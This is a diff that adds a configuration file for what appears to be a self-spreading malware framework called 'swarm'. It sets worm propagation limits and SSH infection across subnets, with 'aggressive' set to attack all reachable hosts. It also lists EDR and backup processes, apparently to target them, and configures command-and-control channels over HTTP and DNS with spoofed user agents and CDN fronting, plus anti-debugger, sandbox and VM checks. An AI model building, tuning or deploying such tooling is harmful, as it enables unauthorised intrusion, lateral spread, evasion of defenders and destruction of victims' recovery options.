@@ -1,0 +1,87 @@
+# Swarm Configuration
+# Copy to swarm.toml or place in ~/.config/swarm/swarm.toml
+
+[arena]
+name_prefix = "swarm_"
+max_messages = 2048
+max_message_size = 8192
+max_agents = 16
+
+[heartbeat]
+interval_secs = 10
+timeout_secs = 30
+
+[consensus]
+threshold = 0.66
+hoarder_threshold = 0.80
+default_reputation = 1.0
+decay_rate_per_hour = 0.2
+reward_delta = 0.1
+penalty_delta = 0.2
+
+[agents]
+scout_scan_interval_secs = 15
+shaper_decision_interval_secs = 30
+weaver_mutation_interval_secs = 120
+worm_max_hops = 10
+worm_max_infections_per_minute = 2
+worm_self_destruct_secs = 3600
+edr_processes = ["csfalcon", "csagent", "msmpeng", "sentinelone", "carbonblack", "cylancesvc", "symantec", "mcafee"]
+backup_processes = ["veeam", "backup_exec", "commvault", "netbackup", "backup_agent", "vss"]
+
+[c2]
+url = "https://localhost:8443/collect"
+api_key = ""
+dns_domain = "swarm.c2.local"
+dns_resolver = "8.8.8.8"
+http_user_agents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0",
+]
+cdn_hosts = ["cdn.jsdelivr.net", "cdnjs.cloudflare.com"]
+
+[exploits]
+enabled = false
+operator_approved = false
+target_whitelist = []
+max_attempts = 3
+safe_mode = true
+forbidden_segments = ["10.0.0.0/8", "172.16.0.0/12"]
+
+[limits]
+max_processes = 20
+max_disk_mb = 100
+max_network_mbps = 1.0
+business_hours_only = true
+
+[anti_analysis]
+check_debugger = true
+check_sandbox = true
+check_vm = true
+check_timing = true
+random_delay_min_secs = 1
+random_delay_max_secs = 10
+
+# ── BRAIN CONFIG ────────────────────────────────────────────────────────
+# Hosts that MUST NEVER be attacked (operator machines, C2 server, etc.)
+# The swarm checks these before ANY offensive action.
+
+[brain]
+safe_ips = [
+    "192.168.1.100",   # operator workstation
+    "192.168.1.1",     # gateway/router
+]
+safe_hostnames = [
+    "operator-pc",
+    "c2-server",
+    "swarm-master",
+]
+
+# ── COLONY CONFIG ───────────────────────────────────────────────────────
+# Controls how aggressively the swarm spreads.
+
+[colony]
+aggressive = true               # true = attack all reachable hosts
+scan_subnets = ["192.168.1.0/24", "10.0.0.0/24"]
+max_concurrent_infections = 5    # max parallel SSH attempts
+infection_cooldown_secs = 30     # wait between infection attempts
